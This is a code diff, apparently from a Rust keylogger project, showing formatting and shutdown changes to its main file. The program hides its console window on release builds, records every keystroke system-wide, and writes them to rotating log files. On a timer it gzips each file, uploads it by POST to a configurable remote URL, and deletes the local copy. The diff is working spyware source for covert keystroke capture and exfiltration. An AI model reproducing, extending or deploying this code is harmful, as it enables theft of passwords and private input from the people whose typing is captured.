@@ -1,13 +1,21 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
-use crate::keylog::{spawn_keylogger, KeylogEntry};
+use crate::keylog::{KeyLoggerHandle, KeylogEntry, spawn_keylogger};
 use anyhow::{Context, Result};
 use clap::Parser;
-use flate2::{write::GzEncoder, Compression};
+use flate2::{Compression, write::GzEncoder};
 use rdev::listen;
 use reqwest::Client;
-use std::{path::{Path, PathBuf}, time::Duration};
-use tokio::{fs::{self, File, OpenOptions}, io::{AsyncWriteExt, BufWriter}, select, sync::mpsc};
+use std::{
+    path::{Path, PathBuf},
+    time::Duration,
+};
+use tokio::{
+    fs::{self, File, OpenOptions},
+    io::{AsyncWriteExt, BufWriter},
+    select,
+    sync::mpsc,
+};
 
 mod keylog;
 
@@ -55,15 +63,20 @@ async fn rotate_log_file(current_path: &Path) -> Result<Option<PathBuf>> {
     }
 
     let timestamp = chrono::Utc::now().format("%Y%m%d%H%M%S");
-    let file_stem = current_path.file_stem().unwrap_or_default().to_string_lossy();
-    let extension = current_path.extension().unwrap_or_default().to_string_lossy();
+    let file_stem = current_path
+        .file_stem()
+        .unwrap_or_default()
+        .to_string_lossy();
+    let extension = current_path
+        .extension()
+        .unwrap_or_default()
+        .to_string_lossy();
 
-    let pending_path = current_path.with_file_name(format!(
-        "{}.{}.pending.{}",
-        file_stem, timestamp, extension
-    ));
+    let pending_path =
+        current_path.with_file_name(format!("{}.{}.pending.{}", file_stem, timestamp, extension));
 
-    fs::rename(current_path, &pending_path).await
+    fs::rename(current_path, &pending_path)
+        .await
         .context("Failed to rotate log file")?;
 
     Ok(Some(pending_path))
@@ -85,7 +98,8 @@ async fn gzip_and_upload(url: String, file_path: PathBuf) -> Result<()> {
 
     let form = reqwest::multipart::Form::new().part("file", part);
 
-    let response = client.post(&url)
+    let response = client
+        .post(&url)
         .multipart(form)
         .send()
         .await
@@ -95,19 +109,18 @@ async fn gzip_and_upload(url: String, file_path: PathBuf) -> Result<()> {
         anyhow::bail!("Upload failed with status: {}", response.status());
     }
 
-    fs::remove_file(&file_path).await.context("Failed to delete uploaded file")?;
+    fs::remove_file(&file_path)
+        .await
+        .context("Failed to delete uploaded file")?;
     println!("Upload successful. Deleted local artifact.");
 
     Ok(())
 }
 
-async fn run_persistence_loop(
-    args: Args, 
-    mut rx: mpsc::Receiver<KeylogEntry>
-) -> Result<()> {
+async fn run_persistence_loop(args: Args, mut rx: mpsc::Receiver<KeylogEntry>) -> Result<()> {
     let mut writer = BufWriter::new(open_log_file(&args.output).await?);
     let mut upload_interval = tokio::time::interval(Duration::from_secs(args.upload_interval));
-loop {
+    loop {
         select! {
             maybe_entry = rx.recv() => {
                 match maybe_entry {
@@ -128,8 +141,8 @@ loop {
                 if let Err(e) = writer.flush().await {
                     eprintln!("Error flushing buffer before rotation: {}", e);
                 }
-                
-                drop(writer); 
+
+                drop(writer);
 
                 match rotate_log_file(&args.output).await {
                     Ok(Some(pending_path)) => {
@@ -156,22 +169,36 @@ loop {
 async fn main() -> Result<()> {
     let args = Args::parse();
     println!("Starting Keylogger...");
-    println!("Aggregation: {}ms | Upload: {}s", args.logger_interval, args.upload_interval);
+    println!(
+        "Aggregation: {}ms | Upload: {}s",
+        args.logger_interval, args.upload_interval
+    );
 
-    let logger_handle = spawn_keylogger(Duration::from_millis(args.logger_interval));
+    let KeyLoggerHandle {
+        event_tx,
+        report_rx,
+        thread_handle,
+    } = spawn_keylogger(Duration::from_millis(args.logger_interval));
 
     let manager_args = args.clone();
     let manager_handle = tokio::spawn(async move {
-        if let Err(e) = run_persistence_loop(manager_args, logger_handle.report_rx).await {
+        if let Err(e) = run_persistence_loop(manager_args, report_rx).await {
             eprintln!("Persistence loop crashed: {:?}", e);
         }
     });
 
-    let tx = logger_handle.event_tx.clone();
+    let tx = event_tx.clone();
     if let Err(error) = listen(move |event| {
         let _ = tx.send(event);
     }) {
         eprintln!("Input listener error: {:?}", error);
+    }
+
+    println!("Input listener stopped. Shutting down...");
+    drop(event_tx);
+
+    if let Err(e) = thread_handle.join() {
+        eprintln!("Aggregator thread finished with panic: {:?}", e);
     }
 
     let _ = manager_handle.await;
